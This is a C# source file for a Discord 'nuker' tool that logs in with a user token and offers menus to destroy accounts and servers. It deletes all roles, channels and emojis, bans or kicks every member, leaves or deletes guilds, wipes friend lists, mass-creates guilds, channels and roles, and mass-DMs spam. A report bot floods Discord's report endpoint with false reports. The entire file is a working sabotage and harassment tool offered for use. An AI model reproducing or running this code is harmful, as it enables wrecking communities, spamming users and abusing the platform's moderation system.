using System;
using System.IO;
using System.Threading;
using Discord;
using Discord.Gateway;
using Leaf.xNet;
using Newtonsoft.Json;
using System.Drawing;
using Console = Colorful.Console;

/* 
       │ Author       : extatent
       │ Name         : nuker
       │ GitHub       : https://github.com/extatent
*/

namespace nuker
{
    class Program
    {
        public static string token;

        public static void GetConfig()
        {
            StreamReader read = new StreamReader("config.json");
            string json = read.ReadToEnd();
            config config = JsonConvert.DeserializeObject<config>(json);
            token = config.token;
        }

        public static void SaveConfig(string token)
        {
            config config = new config
            {
                token = token,
            };

            var responseData = config;
            string jsonData = JsonConvert.SerializeObject(responseData);
            File.WriteAllText("config.json", jsonData);
        }

        static DiscordSocketClient client = new DiscordSocketClient();
        static ulong guildid;

        static void WriteLogo()
        {
            Console.WriteLine(@"        _ _   _           _                            __        _        _             _   
   __ _(_) |_| |__  _   _| |__   ___ ___  _ __ ___    / /____  _| |_ __ _| |_ ___ _ __ | |_ 
  / _` | | __| '_ \| | | | '_ \ / __/ _ \| '_ ` _ \  / / _ \ \/ / __/ _` | __/ _ \ '_ \| __|
 | (_| | | |_| | | | |_| | |_) | (_| (_) | | | | | |/ /  __/>  <| || (_| | ||  __/ | | | |_ 
  \__, |_|\__|_| |_|\__,_|_.__(_)___\___/|_| |_| |_/_/ \___/_/\_\\__\__,_|\__\___|_| |_|\__|
  |___/                                                                                     " + Environment.NewLine, Color.BlueViolet);
        }

        static void Main(string[] args)
        {
            WriteLogo();
            GetConfig();
            if (string.IsNullOrEmpty(token))
            {
                Console.Write("Token: ");
                string token = Console.ReadLine();

                SaveConfig(token);

                client.Login(token);
            }
            else
            {
                client.Login(token);
            }

            Console.Title = $"github.com/extatent | {client.User}";

            WriteLine("1", "Account nuker");
            WriteLine("2", "Server nuker");
            WriteLine("3", "Report bot");
            Console.Write("Your choice: ");
            string option = Console.ReadLine();
            if (option == "1")
            {
                Console.Title = $"github.com/extatent | {client.User}";
                Console.Clear();
                AccountNuker();
            }
            else if (option == "2")
            {
                Console.Write("Guild ID: ");

                guildid = ulong.Parse(Console.ReadLine());

                DiscordGuild guild = client.GetGuild(guildid);

                Console.Title = $"github.com/extatent | {client.User} | {guild.Name}";
                Console.Clear();
                ServerNuker();
            }
            else if (option == "3")
            {
                Console.Write("Guild ID: ");
                string guildid = Console.ReadLine();
                Console.Write("Channel ID: ");
                string channelid = Console.ReadLine();
                Console.Write("Message ID: ");
                string messageid = Console.ReadLine();
                Console.WriteLine("[1] Illegal Content\n[2] Harrassment\n[3] Spam or Phishing Links\n[4] Self harm\n[5] NSFW");
                Console.Write("Your choice: ");
                string reason = Console.ReadLine();
                Console.WriteLine ("Reports count: ");
                int count = int.Parse(Console.ReadLine());

                HttpRequest httpRequest = new HttpRequest();
                httpRequest.Authorization = token;
                httpRequest.UserAgentRandomize();
                string url = "https://discord.com/api/v10/report";
                string jsonData = string.Concat(new string[]
                {
            "{\"channel_id\": \"",
            channelid,
            "\", \"guild_id\": \"",
            guildid,
            "\", \"message_id\": \"",
            messageid,
            "\", \"reason\": \"",
            reason,
            "\" }"
                });
                int reports = 0;
                for (int i = 0; i < count; i++)
                {
                    try
                    {
                        HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
                        bool ok = response.StatusCode.ToString() == "Created";
                        if (ok)
                        {
                            reports++;
                        }

                        Console.Title = $"github.com/extatent | {client.User} | Reports sent: " + reports.ToString();
                    }
                    catch
                    { }
                }
                Console.Title = $"github.com/extatent | {client.User}";
                Console.WriteLine("Done. Total reports sent: " + reports.ToString());
            }
            else
            {
                Console.WriteLine("Wrong key");
            }

            Console.ReadLine();
        }

        class config
        {
            public string token { get; set; }
        }

        static void WriteLine(string number, string text)
        {
            Console.Write("[");
            Console.Write(number, Color.BlueViolet);
            Console.WriteLine("] " + text);
        }

        static void AccountNuker()
        {
            WriteLogo();
            WriteLine("1", "Terminate account");
            WriteLine("2", "Leave and delete guilds");
            WriteLine("3", "Remove all relationships (clear blocked users list, friend list, request list)");
            WriteLine("4", "Leave HypeSquad");
            WriteLine("5", "Remove connections");
            WriteLine("6", "Deauthorize apps");
            WriteLine("7", "Mass create guilds");
            WriteLine("8", "Seizure mode");
            WriteLine("9", "Confuse mode");
            WriteLine("10", "Mass dm");
            Console.Write("Your choice: ");
            string option = Console.ReadLine();
            if (option == "1")
            {
                using (HttpRequest req = new HttpRequest())
                {
                    while (true)
                    {
                        try
                        {
                            req.AddHeader("Authorization", token);
                            req.Post("https://discordapp.com/api/v9/invite/terraria");
                            client.Token = token;
                        }
                        catch
                        { }
                    }
                }
            }
            else if (option == "2")
            {
                foreach (var guild in client.GetGuilds())
                {
                    try
                    {
                        if (guild.Owner)
                        {
                            guild.Delete();
                        }
                        else
                        {
                            guild.Leave();
                        }
                        Thread.Sleep(200);
                    }
                    catch { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "3")
            {
                foreach (var relationship in client.GetRelationships())
                {
                    try
                    {
                        if (relationship.Type == RelationshipType.Friends)
                        {
                            relationship.Remove();
                        }
                        if (relationship.Type == RelationshipType.IncomingRequest)
                        {
                            relationship.Remove();
                        }
                        if (relationship.Type == RelationshipType.OutgoingRequest)
                        {
                            relationship.Remove();
                        }
                        if (relationship.Type == RelationshipType.Blocked)
                        {
                            relationship.Remove();
                        }
                        Thread.Sleep(200);
                    }
                    catch
                    { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "4")
            {
                client.User.SetHypesquad(Hypesquad.None);
                client.User.Update();
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "5")
            {
                foreach (var connections in client.GetConnectedAccounts())
                {
                    try
                    {
                        connections.Remove();
                        Thread.Sleep(200);
                    }
                    catch
                    { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "6")
            {
                foreach (var apps in client.GetAuthorizedApps())
                {
                    try
                    {
                        apps.Deauthorize();
                        Thread.Sleep(200);
                    }
                    catch
                    { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "7")
            {
                try
                {
                    Console.Write("Guild name: ");
                    string name = Console.ReadLine();

                    while (true)
                    {
                        for (int i = 0; i < 100; i++)
                        {
                            client.CreateGuild(name);
                            Thread.Sleep(200);
                        }
                    }

                }
                catch
                { }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "8")
            {
                try
                {
                    while (true)
                    {
                        for (int i = 0; i < 1000; i++)
                        {
                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                            Thread.Sleep(200);
                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
                            Thread.Sleep(200);
                        }
                    }
                }
                catch
                { }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "9")
            {
                try
                {
                    client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Chinese, Theme = DiscordTheme.Light, DeveloperMode = false, EnableTts = true, CompactMessages = true, ExplicitContentFilter = ExplicitContentFilter.DoNotScan });
                }
                catch
                { }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else if (option == "10")
            {
                Console.Write("Message: ");
                string message = Console.ReadLine();

                var relationships = client.GetRelationships();

                foreach (var relationship in relationships)
                {
                    if (relationship.Type == RelationshipType.Friends)
                    {
                        PrivateChannel channel = client.CreateDM(relationship.User.Id);
                        client.SendMessage(channel, message);
                        Thread.Sleep(200);
                    }
                }

                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
            else
            {
                Console.WriteLine("Wrong key");
                Thread.Sleep(2000);
                Console.Clear();
                AccountNuker();
            }
        }

        static void ServerNuker()
        {
            WriteLogo();
            WriteLine("1", "Delete all roles");
            WriteLine("2", "Remove all bans");
            WriteLine("3", "Delete all channels");
            WriteLine("4", "Delete all emojis");
            WriteLine("5", "Delete all invites");
            WriteLine("6", "Mass create roles");
            WriteLine("7", "Mass create channels");
            WriteLine("8", "Ban all members");
            WriteLine("9", "Kick all members");
            WriteLine("10", "Mass dm");
            Console.Write("Your choice: ");
            string option = Console.ReadLine();
            DiscordGuild guild = client.GetGuild(guildid);
            if (option == "1")
            {
                foreach (var roles in guild.GetRoles())
                {
                    try
                    {
                        roles.Delete();
                        Thread.Sleep(200);
                    }
                    catch { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "2")
            {
                foreach (var bans in guild.GetBans())
                {
                    try
                    {
                        bans.Unban();
                        Thread.Sleep(200);
                    }
                    catch { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "3")
            {
                foreach (var channels in guild.GetChannels())
                {
                    try
                    {
                        channels.Delete();
                        Thread.Sleep(200);
                    }
                    catch { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "4")
            {
                foreach (var emojis in guild.GetEmojis())
                {
                    try
                    {
                        emojis.Delete();
                        Thread.Sleep(200);
                    }
                    catch { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "5")
            {
                foreach (var invites in guild.GetInvites())
                {
                    try
                    {
                        invites.Delete();
                        Thread.Sleep(200);
                    }
                    catch { }
                }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "6")
            {
                try
                {
                    while (true)
                    {
                        for (int i = 0; i < 100; i++)
                        {
                            guild.CreateRole();
                            Thread.Sleep(200);
                        }
                    }
                }
                catch
                { }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "7")
            {
                try
                {
                    Console.Write("Channel name: ");
                    string name = Console.ReadLine();

                    while (true)
                    {
                        for (int i = 0; i < 100; i++)
                        {
                            guild.CreateChannel(name, 0);
                            Thread.Sleep(200);
                        }
                    }
                }
                catch
                { }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "8")
            {
                try
                {
                    var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
                    var members = get.GetMembers();

                    foreach (var user in members)
                    {
                        user.Ban();
                        Thread.Sleep(200);
                    }
                }
                catch
                { }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "9")
            {
                try
                {
                    var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
                    var members = get.GetMembers();

                    foreach (var user in members)
                    {
                        user.Kick();
                        Thread.Sleep(200);
                    }
                }
                catch
                { }
                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else if (option == "10")
            {
                Console.Write("Message: ");
                string message = Console.ReadLine();

                var get = client.GetCachedGuild(Convert.ToUInt64(guildid));
                var members = get.GetMembers();

                foreach (var user in members)
                {
                    PrivateChannel channel = client.CreateDM(user.User.Id);
                    client.SendMessage(channel, message);
                    Thread.Sleep(200);
                }

                Console.WriteLine("Done");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
            else
            {
                Console.WriteLine("Wrong key");
                Thread.Sleep(2000);
                Console.Clear();
                ServerNuker();
            }
        }
    }
}
